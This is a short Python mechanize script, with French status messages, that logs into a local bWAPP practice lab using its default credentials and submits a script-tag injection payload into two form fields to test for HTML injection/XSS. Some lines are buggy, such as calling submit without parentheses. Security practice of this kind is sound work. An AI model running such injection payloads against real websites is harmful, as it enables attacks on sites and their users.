import mechanize

br=mechanize.Browser()
br.open("http://localhost/bWAPP/htmli_get.php")

for form in br.forms():
    if form=="GET":
        print("trouvé")
    else:
        print("non trouvé")
br.select_form(nr=0)
br.form['login']='bee'
br.form['password']='bug'
response=br.submit()

for form in br.forms():
    if form.method=="GET":
        br.form=form
        print("form troué")
        break
    else:
        print("non trouvé")

br.form['firstname'] = '<script>alert("Hello")</script>'
br.form['lastname'] = '<script>alert("Hello")</script>'
response=br.submit
rep_html=response.read().decode()
print("rep html")
print(rep_html)
